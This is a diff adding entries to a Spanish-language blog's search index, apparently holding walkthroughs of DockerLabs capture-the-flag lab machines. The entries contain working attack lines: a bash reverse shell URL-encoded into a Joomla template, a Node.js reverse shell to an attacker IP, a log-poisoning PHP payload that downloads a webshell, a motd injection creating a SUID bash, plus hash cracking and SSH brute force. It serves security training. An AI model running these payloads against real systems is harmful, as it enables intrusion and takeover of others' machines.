@@ -1,10 +1,724 @@
 [
   
   {
+    "title": "Vulnerame , DockerLabs",
+    "url": "/posts/comida/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, joomla, rce",
+    "date": "2024-07-13 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  rce  Reverse shell  Enumeracion ficheros y directorios  Crack con john BCRYPTHerramientas y recursos  nmap  feroxbuster  john  sshReconocim...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  rce  Reverse shell  Enumeracion ficheros y directorios  Crack con john BCRYPTHerramientas y recursos  nmap  feroxbuster  john  sshReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX comida  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh en el 22Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Nos encontramos directorio trucho wordpress pero con un joomla dentro, necesitamos saber la version .Joomla en versiones antiguas como debe ser esta la guarda en administrator/manifests/files/joomla.xml*Sabiendo este dato ya podemos seguir buscando por la web como poder acceder a este joomla.Buscando encontramos que alguna versiones de joomla te regalan la info que no deberia Unauthenticated information disclosure y un cve asociado CVE-2023-23752.Este cve se aprovecha de que quedan expuestos datos json y se puede entrar sin mas en las siguientes direcciones.api/index.php/v1/config/application?public=trueapi/index.php/v1/users?public=trueEsas dos rutas corresponden a datos de configuracion del joomla y a los usuarios dentro de joomla.InfiltracionCon los datos proporcionados deberiamos de poder hacer login en mysql y navegar hasta los passwords.mysql -h 172.17.0.2 -u joomla_user -pshow databases;use joomla_db;show tables;select * from ffsnq_usersAhora tenemos un hash  segun el amigo ia gpt es un bcrypt asi que le paso a john./home/quino/hacking_tools/brute_passwords_hash/john/run/john --format=BCRYPT -w /home/quino/Descargas/rockyou.txt/rockyou.txt hashJohn me tira la password despues de un tiempito pese a estar en linea 1200 aproximadamente del rockyou.Ahora si estamos listos para entrar a la web.Una vez logueados como administrator vamos a panel de control &gt; dashboard &gt; templates &gt; selecionamos cassiopeia &gt; y yo modifico el error.php dejandolo de la siguinete manera.Guardamos , salimos y vamos a la ruta correcta.Nos preparamos para mandarnos una reverseshell y codeamos la rev.nc -lnvp 1111http://172.17.0.2/wordpress/templates/cassiopeia/error.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.0.112%2F1111%20%3C%261%27Movimientos lateralesUna vez dentro realizamos un sudo -l sin respuesta pero buscando sobre los directorio home de los usuarios vemos que podemos leer un fichero.find /home/ -user www-data -type f 2&gt;/dev/nullAl realizar un cat nos indica que esta en base64 , me lo paso a mi maquina.python3 -m http.server 8000Una vez en nuestra maquina podemos realizar las oportunas comprobaciones con file strings etc para ver bien a que nos enfrentamos.Los pasos correctos son los siguiente dado que no se codifico un texto si no un fichero.base64 -d passwd &gt; ficherofile ficherounzip ficherocat pass.txtAhora podemos ir por ssh ni bien no logeamos ejecutamos sudo -l y nos indica que podemos usar un script como ignacio.Ejecutamos el script y vemos que es lo que hace.Observamos que el script ejecuta un ls sobre ciertos directorios y en la segunda ejecucion no encuentra el fichero, nos desplazamos a la ruta de la segunda ejecucion y creamos el fcichero que falta.Creo un script de bash para mover /bin/bash y le asigno suid posteriomente lo ejecuto para ser ignacio.Con ignacio tenemos que conseguir escapar del euid y convertinos en usuario real ignacio.Ejecutamos las siguentes ordenes , nos vamos al home de ignacio y creamos a la carpeta .ssh para dentro poner el authorized_keys.ssh-keygen -t rsacat id_rsa.pub    nos copiamos el resultadoecho 'resultado' &gt;&gt; authorized_keysssh -i id_rsa ignacio@172.17.0.2Con eso ya estamos como el user ignacio pudiendo ejecutar todo.Primero y como de costumbre sudo -l.Vemos que nos permiten ejecutar un script en ruby dado que tenemos permisos de escritura sobre ese fichero.#!/usr/bin/env rubyrequire 'fileutils'puts \"Feliz hacking\"FileUtils.cp('/bin/bash', '/tmp')puts \"Aprendamos jugando y compartiendo info\"FileUtils.chmod(\"+s\", \"/tmp/bash\")puts \"Esta ya la tienes :-)\"Yo lo dejo asi a falta de ejecutar bash -p.Nos encntramos la misma situacion de antes , bastaria con copiar el authorized_keys de ignacio al /root/.ssh y entrar por ssh.En fin hasta aqui la otra maquina.Saludos y recuerden seguirme en twitter ,,,, si ya se hoy x."
+  },
+  
+  {
+    "title": "DockHackLab , DockerLabs",
+    "url": "/posts/dockhacklab/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, upload",
+    "date": "2024-07-12 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Reverse shell  nano  bash Scripting  Hacking con dockerHerramientas y recursos  nmap  feroxbuster  Scripting bash  DockerReconocimiento y e...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Reverse shell  nano  bash Scripting  Hacking con dockerHerramientas y recursos  nmap  feroxbuster  Scripting bash  DockerReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX practicas  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh 80Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Genial nos encuentra una ruta y un fichero que nos dice por donde van los tiros.Vamos a esa ruta y nos encontramos que nos permite subir ficheros probamos con un php y lo sube.Podemos ver que el nombre lo han alterado asi que nos creamos un script que nos cree el diccionario con la permutaciones correspondietes.#!/bin/bash# Función para generar combinaciones y guardar en el archivo de salidagenerate_dictionary() {  #local prefix=\"xxx_\"    # Prefijo fijo  #local suffix=\".php\"    # Sufijo fijo  local word=\"$1\"        # Palabra proporcionada como argumento  local output_file=\"$2\" # Nombre del archivo de salida  # Eliminar el archivo de salida si existe  rm -f \"$output_file\"  # Loop para generar todas las combinaciones  for c1 in {a..z}; do    for c2 in {a..z}; do      for c3 in {a..z}; do        # Construir la línea del diccionario        combination=\"${c1}${c2}${c3}_${word}\"        echo \"$combination\" &gt;&gt;\"$output_file\"      done    done  done  echo \"Diccionario generado en $output_file\"}# Verificar los argumentos proporcionadosif [ $# -ne 2 ]; then  echo \"Uso: $0 &lt;palabra&gt; &lt;archivo_salida&gt;\"  exit 1fi# Llamar a la función para generar el diccionariogenerate_dictionary \"$1\" \"$2\"Una vez tenemos el diccionario resalizamos un fuzzin para que averigue el nombre del archivo.Nos encuentra rapido el fichero que hemos subido.Depende de lo que hayais subido realizareis algun paso mas o menos.Yo subi un revshell directamente asi que a la escucha con nc.Realizamos el tratamiento a la tty.Con la terminal ya funcional realizamos un sudo -l para empezar.Nos han dejado a nano para abusar, os recomiendo la app searchbins anda genial.Como vemos nos han dejado a docker con permisos de root y tambien que esta knockd y podreos hacer por knocking.Debemos buscar la combinacion y sobre el home de usuario vemos un fichero .docker lo revisamos y da un pista sobre bashrc y funciones , asi que miramos bashrc.Ya tenemos la combinacion ahora debemos de llamar.Despues del port knocking si observamos con ps vemos que se a levantado el servicio dockerd y ahora podrmos hacer uso de docker.Aqui nos vamos a aprovechar de que cuando corramos nuestro contenedor lo vamos a corren con permisos uid 0  y de ese modo vamos a montar todo el disco del contenedor principal en nuestra propia maquina de modo que tendremos todo el sistema de ficheros a nuestra disposicion.Para lo cual fealizamos los siguientes pasos.sudo /usr/bin/docker pull alpineNos descargamos la imagen de alpine por su poco peso y luego la hacemos correr consudo  /usr/bin/docker run -v /:/mnt --rm -it alpine shComo vemos hemos montado todo el raiz del afitrion por asi llamarle.Aqui podemos hacer cualquier cosa editar passwd , copiar un bash y añadirle suid , authorized_keys ,….. yo voy por este ultimoLos comando serian los sigentes , primero generamos las claves , luego la copiamos a su lugar en la carpeta del usuario root en este caso y nos aseguramos que se permita el root login y si no se permite lo modificamos.ssh-keygen -t rsacat id_rsa.pubcd /mnt/root/.sshecho 'el_contenid_que_nos_mostro_cat' &gt;&gt; authorized_keysDesde la maquina atacante y en el directorio donde cremaos las claves nos conectamos por ssh.ssh -i id_rsa root@172.17.0.2Y nos convertimos en root en el contenedor a hackearGracias por leer."
+  },
+  
+  {
+    "title": "Rutas , DockerLabs",
+    "url": "/posts/rutas/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, Path hijacking, vsftpd",
+    "date": "2024-07-11 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Abusar MOTD  RFI  Path hijackingHerramientas y recursos  nmap  feroxbuster  john the ripper  Scripting bashReconocimiento y en...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Abusar MOTD  RFI  Path hijackingHerramientas y recursos  nmap  feroxbuster  john the ripper  Scripting bashReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX practicas  172.17.0.2reporteEn este caso nos detecta el puerto 21 ftp abierto con login anonimo y ya nos muestra los archivos que dispone el servidor ,el 80 http abierto y por ultimo el shh 22 como siempre empezamos por lo menos invasivo que seria revisar la y el codigo fuente por si hay comentarios interesantes.Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Nos encuentra un index php asi que volvemos a revisarlo.Revisando el codigo observamos que en los enlaces nos ofrecen varios dominios el que nos interesa es el del medio.Asi que lo agregamos al fichero hosts.Con el dominio asignado procedemos de nuevo a revisar esa nueva ruta.Vemos que es una configuracion de apache que nos pide user y pass, por el 80 llegamos hasta aqui sin ser invasivos , es momento de usar el ftp.Hacemos login con ftp y descargamos los dos ficheros el hola no contiene nada y el zip esta protegido por contraseña.Procedemos a crackearlozip2john respeta.zip &gt; hashzip john --format=PKZIP -w /home/quino/rockyou.txt hashzipLe hacemos un unzip con la password que nos dio john.El txt nos da un nombre de imagen y una url para buscarla.Cuando vamos a la url vemos que es una web distintos writeups , posicionandonos encima de cualquier imagen vemos donde se guardan las imagenes , asi que solo tenemos que completar la url con el nombre de la imagen que nos proporcionaron en este caso crakpass.jpgComprobamos la imagen algo esconde.Hacemos uso de steghide y vemos que contiene un fichero zip al extraer el zip nos pide salvoconducto que no tiene y el zip nos tira el fichero pass que contiene las credenciales para poder entrar a la web alojada en el dominio.Asi que accedemos a ver que nos esconden.Vuelve a ser la pagina por defecto tratemos de hacer fuzzing para buscar mas fondo y para ello hemos de saber que pasa con este tipo de autentificacion .Yo mismo no consegui encontrar info acerca de como poder hacer fuzzing con los programas habituales , si que os puedo decir que capturando la peticion con burpsuite, tanto el pass como el user van en base64.Despues de buscar como poder fuzear con ffuf un buen rato con comandos que no me aportaron mucho decido crear un par de scripts que realicen ese trabajo(para los habituales de si es necesario saber programar para red team , la respuesta es clara SI y yo he de aprender tambien).Mis scriptsObvio que con un poco de ayuda de la penosa gemini dado que chatgpt me tiene limitado el numero prompts.Este primer script me sirve para buscar el parametro del posible LFI.#!/bin/bash# Verificar que se proporcione un argumento (archivo de palabras)if [ $# -eq 0 ]; then  echo \"Uso: $0 &lt;archivo_de_palabras&gt;\"  exit 1fi# Archivo de palabras proporcionado por el usuariowordlist=\"$1\"# Verificar que el archivo de palabras existe y es legibleif [ ! -f \"$wordlist\" ]; then  echo \"El archivo '$wordlist' no existe o no es legible.\"  exit 1fi# Pedir al usuario las extensiones a probarecho \"Ingrese las extensiones separadas por espacios:\"read -r extensions# Función para realizar la solicitud HTTP con curlmake_request() {  local url=\"$1\"  local response=$(curl -s -o /dev/null -w \"%{http_code}\" -X GET \"$url\" -H \"Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\")  if [ \"$response\" -eq 200 ]; then    echo \"URL exitosa: $url\"  fi}# Ciclo principal para recorrer cada palabra del archivowhile IFS= read -r word; do  # Iterar sobre cada extensión proporcionada por el usuario  for ext in $extensions; do    url=\"http://trackedvuln.dl/${word}.${ext}\"    make_request \"$url\"  donedone &lt;\"$wordlist\"echo \"¡Finalizado!\"Como vemos nos encuentra el fichero index.php que no veiamos ahora podemos volver al navegador y darle un vistazo.Con unas pruebas en la web podemos ver que nos faltaria un parametro y para ello otro script.#!/bin/bash# Verificar que se proporcione un argumento (archivo de palabras)if [ $# -eq 0 ]; then  echo \"Uso: $0 &lt;archivo_de_palabras&gt;\"  exit 1fi# Archivo de palabras proporcionado por el usuariowordlist=\"$1\"# Verificar que el archivo de palabras existe y es legibleif [ ! -f \"$wordlist\" ]; then  echo \"El archivo '$wordlist' no existe o no es legible.\"  exit 1fi# Pedir al usuario las extensiones a probarecho \"Ingrese las rutas de prueba de LFI separadas por espacios:\"read -r extensions# Encabezado de autorización para la autenticación básicaauth_header=\"Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\"# Función para realizar la solicitud HTTP con curl y contar palabrasmake_request() {  local url=\"$1\"  local response=$(curl -s -H \"$auth_header\" \"$url\")  local num_words=$(echo \"$response\" | wc -w)  if [ \"$num_words\" -ge 87 ]; then  # Mostrar solo si tiene 87 palabras o más    echo \"URL exitosa: $url\"    echo \"Número total de palabras en la respuesta: $num_words\"    #echo \"Contenido de la respuesta:\"    #echo \"$response\"    echo \"---\"  fi}# Ciclo principal para recorrer cada palabra del archivowhile IFS= read -r word; do  # Iterar sobre cada extensión proporcionada por el usuario  for ext in $extensions; do    url=\"http://trackedvuln.dl/index.php?${word}=${ext}\"    make_request \"$url\"  donedone &lt;\"$wordlist\"echo \"¡Finalizado!\"Es similar al anterior pero con ligeras modificaciones.Ahora si vamos a la web a realizar las pruebas.Encontramos que es valido para realizar algun ataque asi que si LFI no es probaremos con RFI.Infiltracion y movimientos laterales.Nos preparamos todo para intentar el RFI.Tenemos exito se trata de un RFI. Una vez conectados vemos que hay dos usuarios norberto y maria , con la shell spawneada  relizamos un sudo -lPath hijackingComo vemos podemos ejecutar baner el cual hace uso de el comando head y si nos fijamos bien casi nos dice lo que hay que hacer.Nos desplazamos a /tmp que es donde el path de sudo nos va a leer el fichero que vamos a crear , dentro de tmp creamos un fichero con el nombre head y le damos permisos de ejecucion.Una vez como norberto vemos que podemos realizar y encontramos un ficero de nombre .miscredenciales en el que nos dan alguna pista.Despues de descifrar el pass que esta en braile probamos el pass en todos los lugares en los que se pueda utilizar exito con ssh.Vemos que estamos limitados en una especie de prision con permisos euid lo que limita nuestro movimiento.Escapa de euidEscapemos de ella para ello voy a crear un authorized_keys para poder usar todo el potencial de bash.ssh-keygen -t rsaUna vez creadas nos copiamos la clave publica al directorio de .ssh de maria.echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwVUOX+NRg34q3JoWFGHWSSmeoJgveaKbbAIiLtLyCwbm2i2YhIPsU+8qqF7ML0knzE9UgTIAuJ/KSZYHKtsJ/ORitVivVgvBjPEflovDjLwwKrg0aSNbKri9bTutc1JNwRpUIK4B6934NaIv1xUg5zJXKeD4ZcRAO2wyiEtT2JcjeTdQnn2sENX2xlhkpbQMEcP8HlpNy2JOIeM01euDQ07aW0WO/xCL1LtAjdTv9vsbAksmXd4MAtDbKVP/+E5CMT3QWJxKn1scV2Pc2Pw4Ar4KuboUnEGD6BXbxtPyOF2JrMH4MTsyULTIdL5VvbjWPIbvq1g8aT8dEYuY5+5TP9gE97Pdwl15+CH/OQbSUDJAKV54K2mX53ab/OVbCFo0k1ZLFwlkNN1kDxIiml1HZxLOqEZuIxPrtRVA23ukq+Na4eKhTxIvFid8rvOCzKfD88O4o+ehRtMFuSMTHCsV4F+uSm1sleyiL5iJeta0JSLjaj/GMR/sog0o0zleoHoc= quino@libero' &gt;&gt; authorized_keysEstamos listos para realizar login como dios manda estando situados en el directorio donde creamos las claves lanzamos el ssh.ssh -i id_rsa maria@172.17.0.2En el directorio maria encontramos un fichero .mipass que nos da la pista.Asi que hacemos una busquedafind / -user maria -perm /u=w Vamos a ver que le ponemos al fichero 00-header.echo \"cp /bin/bash /home/maria/bash &amp;&amp; chmod u+s /home/maria/bash\" &gt;&gt; /etc/update-motd.d/00-headerUna vez modificado el fichero solo nos queda volver a hacer login para que se ejecute lo que hallamos insertado.Ahora en mi caso solo debo hacer un ./bash -p y soy root.Nos encontraremos la misma situacion de antes pueden volver a usar el authorized_keys yo no lo probe con root pero debe fucnionar igual.Hasta aqui la maquinita.Escribanme si saben los comandos de wfuzz , ffuf para fuzzear en directorios restringidos.Saludos.   :-)"
+  },
+  
+  {
+    "title": "NodeClimb , DockerLabs",
+    "url": "/posts/nodeclimb/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, Cracking",
+    "date": "2024-07-05 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Cracking password zip  Re0vshell nodeHerramientas y recursos  nmap  John the ripper  RevshellsReconocimiento y enumeracionLo primero como s...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Cracking password zip  Re0vshell nodeHerramientas y recursos  nmap  John the ripper  RevshellsReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX nodeclimb  172.17.0.2reporteEn este caso nos encontramos solo con el protocolo ftp:port:21 abierto por el ssh:port:22.Lo primero que hacemos es comprobar que nos dejaron en el ftp dado que el login es anónimo según nmap.Como vemos tenemos un zip y en su contenido hay un txt que presumible mente es un password , como solo esa cifrado un cat nos permite ver lo que hay dentro del zip.Pasemos a crakear el fichero como siempre primero lo convertimos  a un hash y así luego john realiza las comprobaciones para averiguar cual es.zip2john secretitopicaron.zip &gt; secretohashjohn --format=PKZIP -w /home/quino/rockyou.txt secretohashInfiltracion y escalada.Una vez con las credenciales intentamos acceder por ssh.Nos encontramos con script.js y si ejecutamos sudo -l , vemos que tenemos permisos con node hacia ese fichero. Asi que nos creamos una revshell con el siguiente código.(function(){    var net = require(\"net\"),        cp = require(\"child_process\"),        sh = cp.spawn(\"sh\", []);    var client = new net.Socket();    client.connect(1111, \"192.168.0.112\", function(){        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);    });    return /a/; // Prevents the Node.js application from crashing})();Nos ponemos a las escucha con nc en nuestra maquina y posteriormente procedemos a ejecutar el script como indica sudo -l.Muchas gracias por leer"
+  },
+  
+  {
+    "title": "Master , DockerLabs",
+    "url": "/posts/master/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, wordpress, bash command inyection",
+    "date": "2024-07-02 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Busqueda de vulnerabilidad en wordpress  wp-automatic 3.92 ultima vulnerable  Inyeccion de comandos a script de bashHerramientas y recursos...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Busqueda de vulnerabilidad en wordpress  wp-automatic 3.92 ultima vulnerable  Inyeccion de comandos a script de bashHerramientas y recursos  nmap  sudoReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX master 172.17.0.2reporteEn este caso nos encontramos solo con el protocolo http abierto por el 80 y lo que aparentemenmte es un wordpress no aparenta ser vulnerable y herramientas como wpscan no reportan nada.No obstante hay un bug en un pluggin que esta usando.Analizamos visualmente y tambien su codigo , visualmete ya nos encontramos que tiene el plugin wp-automatic que se encarga de auto postear , traducir y reescribir contenido desde otros lugare , o  eso creo.En este caso no era listable el contenido y aparte de la pista de arriba tambien podemos encontrarlo de otras fomas leyendo en bruto,  con curl y con grep ……infoYo encontre dos formas de explotarlo una desde burpsuite y la otra un script python como con burp no me llevo bien del todo tiro del script.scriptAl ejecutarlo nos creo un usuario privilegiado en wordpress. asi que vamos a ello.InfiltracionUna vez dentro voy a hacerla corta , me desplaza a add new pluggin e instalo un file manager y lo activamos.Como veis en la imagen de abajo me desplazo al dir uploads y creo un fichero con el contenido de la rev de monkey.Una vez creado solo nos ponemos a la escuha primero y luego ejecutamos desde el navegador.Una vez dentro seremos www-data y necesitamos empezar a movernos lateralmente entre usuarios.Movimientos lateralesCon sudo -l tenemos suerteSi abusamos de php nos convertimos en pylon.Volvemos a ejecutar sudo -l  y a ver que nos dejaron.Nos dejo un script para oder pasar a mario , ejecutemsolo y veamos que hace.Pareciera que es parecido al que la maquina whoiam y hace uso de eq. ASi que trataremos de inyectarle el array con nuestro comando.Ahora como mario a por root encontramos lo mismo pero apuntando al directorio de pylon.  Metodo manual con  burpsuiteMuchas gracias por llegar hasta aqui"
+  },
+  
+  {
+    "title": "Los 40 Ladrones , DockerLabs",
+    "url": "/posts/los40ladrones/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, Port knocking",
+    "date": "2024-07-01 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Port knockingHerramientas y recursos  nmap  feroxbuster  knockingReconocimiento y enumeracionLo primero como siempre le tiramo...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Brute Force  Port knockingHerramientas y recursos  nmap  feroxbuster  knockingReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX losladrones  172.18.0.2reporteEn este caso y con el comando habitual solo detecta el puerto 80 http abierto,  así que procedemos a revisar la web pese a lo que aparenta.Lanzamos un poco de fuzzingferoxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.17.0.2 No encuentra ningún directorio pasamos a buscar ficheros.Busquemos ficheros.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Con la búsqueda de ficheros hemos tenido mas éxito y no encentra un txt , miremos lo para ver que tenemos.Como vemos tenemos un posible usuario toctoc y si tiene trastorno obsesivo compulsivo pues se volvió loco buscando como entrar.Es obvio que algo se nos paso si  nos están dando un usuario y lo que parecen ser puertos , deberemos de localizar donde esta ssh y en que estado esta el puerto.nmap --top-ports 25T -n -Pn 172.17.0.2 Decido ejecutarlo así por si aparte de estar filtrado lo hubiesen también cambiado de puerto cosa no descabellada.En este caso parece estar en el 22.Sin mas lanzamos un golpeteo contra los puertos que indica el fichero qdefense.txtknock 172.17.0.2 7000 8000 9000 -v Como vemos en la imagen después del golpeteo ya figura el estado de abierto y podemos empezar con la fuerza bruta y el usuario toctoc.hydra -l toctoc -P /home/quino/rockyou.txt ssh://172.17.0.2 -t 64 -VI Nos logeamos con el user toctoc y empezamos a buscar como escalar privilegios.Lo primero que ejecuto es sudo -lTenemos suerte revisamos pero algo no cuadra y hay que seguir buscando.Posteriormente encontramos.Viendo esas instrucciones halladas en una funcioncita en bashrc nos trasladamos a la maquina atacante y knocking de nuevo.Retornamos a la victima y buscamos que ha sucedido y ahora tendremos el bash con permisos suid.Escalada finalAsi que …………sudo /opt/bash -pMuchas gracias por leer ayuda y comparte conocimiento."
+  },
+  
+  {
+    "title": "Veneno , DockerLabs",
+    "url": "/posts/veneno/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, Log poisoning",
+    "date": "2024-06-26 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  LFI to RCE  Log poisoning  findHerramientas y recursos  nmap  feroxbuster  wfuzz  exiftoolReconocimiento y enumeracionLo primero como siemp...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  LFI to RCE  Log poisoning  findHerramientas y recursos  nmap  feroxbuster  wfuzz  exiftoolReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX veneno  172.18.0.2reporteEn este caso nos encontramos  con el protocolo ssh abierto en su versión 7.6 y el http por el 80.La web es la de la instalación por defecto y la versión de ssh nos invita a realizar enumeración de usuarios.No obstante prefiero hacer un poco de fuzing pq si no hay nada para que esta corriendo.Buscando directoriosferoxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -u http://172.17.0.2 Busquemos ficheros.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Investigamos el fichero problems.php y vemos que nos devuelve siempre al index.html pongamos lo que pongamos , por tanto esta esperando un parámetro especifico que modifique su acción.Fuzeamos en busca del parámetro.wfuzz -c --hl=363 -t 200 -w /usr/share/dict/wordlist-probable.txt -u \"http://172.17.0.2/problems.php?FUZZ=/etc/passwd\"Una vez obtenido el parámetro podemos tratar de leer ficheros y corroboramos que podemos leer /etc/passwd.Ya tenemos un usuario al alcance , pero en esta maquina no van por ahí los tiros así que buscamos logs que nos ayuden.Log poisoningEncontramos que tenemos el access.log a disposición , tratamos de envenenarlo.Recordemos que teníamos el directorio uploads con permisos, así que tratamos de subir un a webshell , descargamos la que nos guste y no montamos con python un server el cual dejamos a la espera para posterior subir la webshell con la siguiente petición.curl -i -v 172.17.0.2 -A \"&lt;?php system('curl 192.168.0.112:8000/webshell.php -o /var/www/html/uploads/webshell.php'); ?&gt;\"El comando superior nos creara un nuevo registro en el access.log el cual se ejecutara cuando refresquemos la pagina y si todo ha ido bien , solo debemos entrar en /uploads y ejecutar la webshell.IntrusiónUna vez dentro nos encontramos.Hacemos un ls sobre el home para ver usuarios y también sobre el directorio html en el cual encontramos un fichero curioso.Como vemos nos dice que el fichero tiene 24 años y es el mismo desde entonces , osea que debemos buscar un fichero con esa antiguedad.Haremos uso de find indicándole los días que hace que tiene el fichero.find / -type f -mtime +8760 2&gt;/dev/nullLeemos el ficheroTenemos ya un pass imaginemos que es el de carlos.Vamos a sshUna vez logueados con Carlos  revisamos su home y nos encontramos lo siguiente.Esa estructura nos lleva a suponer que hay algo escondido.Ejecutando un ls -laR podemos listar todo y veremos lo que nos interesa.Nos montamos un server con python y descargamos la imagen para analizarla.Le pasamos exiftool y veremos una pass conocida.Muchas gracias por llegar hasta aquí , aprendamos juntos y compartamos el conocimiento sea mucho o poco tu opinión puede aportar siempre.  Si fuzeamos demasiado podemos tener problemas para cargar el access.log , recomiendo en ese caso reiniciar la maquina."
+  },
+  
+  {
+    "title": "Obsession , DockerLabs",
+    "url": "/posts/obssesion/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-06-25 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Un poco de nmap  Acceso ftp  Hydra  Escalada vimHerramientas y recursos  nmap  HydraReconocimiento y enumeracionLo primero como siempre le tiramos un nmap c...",
+    "content": "En este reto de DockerLabs practicamos.  Un poco de nmap  Acceso ftp  Hydra  Escalada vimHerramientas y recursos  nmap  HydraReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX obsession 172.17.0.2reporteComo vemos en el reporte disponemos de tres puertos abiertos uno con el 21 FTP el 22 SSH y el 80 http con apache.Como vemos en el reporte el ftp permite login anónimo así que vamos a ver que hay.Como vemos hay dos archivos , los descargamos y revisamos.get chat-gonza.txtget pendientes.txtComo vemos en el primer fichero tenemos dos posibles usuarios así que lanzamos HYDRA mientras revisamos la web por si hay algo mas.Como observamos tanto en la web como en el chat del ftp parece que el user principal es russoski.hydra -l russoski -P /home/quino/rockyou.txt ssh://172.17.0.2InfiltracionNos logueamos y ya nos dijo que habían permiso incorrectos.Como no recuerdo miro como ejecutar vim para escalar privilegios con searchbins.Hasta aquí la maquinita.Gracias por leer"
+  },
+  
+  {
+    "title": "ChocolateFire, DockerLabs",
+    "url": "/posts/chocolatefire/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, Openfire cms",
+    "date": "2024-06-25 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Uso de metasploit RCEHerramientas y recursos  nmap  metasploitReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con lo...",
+    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Uso de metasploit RCEHerramientas y recursos  nmap  metasploitReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX chocolatefire 172.18.0.2reporteComo vemos en el reporte en esta ocasión nos han dejado un montón de puertos para investigar yo a por el primero que he ido ha sido el 9090 que es el que devolvía claramente un 200 ok.Nos devuelve un login en el cual tenemos acceso con pass y user adminRevisando por internet vemos que hay varias formas de explotación y de versiones explotables en este caso estamos frete a una 4.7.4.No me caliento mucho y voy directo a usar msfconsole.InfiltraciónNos aporta dos posibilidades , elijan el RCE.Vemos que opciones hay que configurar y procedemos.Una vez todo listo solo que correr el exploit con RUN o EXPLOIT.Gracias por leer"
+  },
+  
+  {
+    "title": "HereBash , DockerLabs",
+    "url": "/posts/herebash/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico, bash basico, stego, John",
+    "date": "2024-06-17 00:00:00 -0300",
+    
+
+
+
+
+
+    
